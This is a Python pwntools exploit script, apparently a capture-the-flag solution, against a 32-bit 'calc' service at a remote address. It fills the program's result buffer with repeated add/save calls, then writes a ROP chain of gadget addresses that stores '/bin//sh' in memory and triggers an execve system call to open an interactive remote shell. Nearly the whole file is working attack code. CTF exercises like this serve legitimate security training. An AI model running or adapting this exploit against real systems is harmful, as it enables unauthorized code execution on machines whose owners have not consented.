#!/usr/bin/env python

from pwn import *
from struct import pack

context.log_level = "debug"

elf = "./calc"

#p = process(elf)
p = remote("111.230.149.72", 10009)

def add(a, b):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("interger a:")
    p.sendline(str(a))
    p.recvuntil("interger b:")
    p.sendline(str(b))

def save():
    p.recvuntil("> ")
    p.sendline("5")

for i in range(0x40):
    add(0, 0)
    save()

add(int(0x44), 0)
save()

add(0, int(0x08056ad3)) # pop edx ; ret
save()
add(0, int(0x080ea060)) # @ .data
save()
add(0, int(0x080b8446)) # pop eax ; ret
save()
add(0, int(0x6e69622f))
save()
add(0, int(0x080551fb)) # mov dword ptr [edx], eax ; ret
save()
add(0, int(0x08056ad3)) # pop edx ; ret
save()
add(0, int(0x080ea064)) # @ .data + 4
save()
add(0, int(0x080b8446)) # pop eax ; ret
save()
add(0, int(0x68732f))
save()
add(0, int(0x080551fb)) # mov dword ptr [edx], eax ; ret
save()
add(0, int(0x08056ad3)) # pop edx ; ret
save()
add(0, int(0x080ea068)) # @ .data + 8
save()
add(0, int(0x08049603)) # xor eax, eax ; ret
save()
add(0, int(0x080551fb)) # mov dword ptr [edx], eax ; ret
save()
add(0, int(0x080481c9)) # pop ebx ; ret
save()
add(0, int(0x080ea060)) # @ .data
save()
add(0, int(0x080dee5d)) # pop ecx ; ret
save()
add(0, int(0x080ea068)) # @ .data + 8
save()
add(0, int(0x08056ad3)) # pop edx ; ret
save()
add(0, int(0x080ea068)) # @ .data + 8
save()
add(0, int(0x08049603)) # xor eax, eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0807b01f)) # inc eax ; ret
save()
add(0, int(0x0806d445)) # int 0x80
save()

p.sendline("6")

p.interactive()
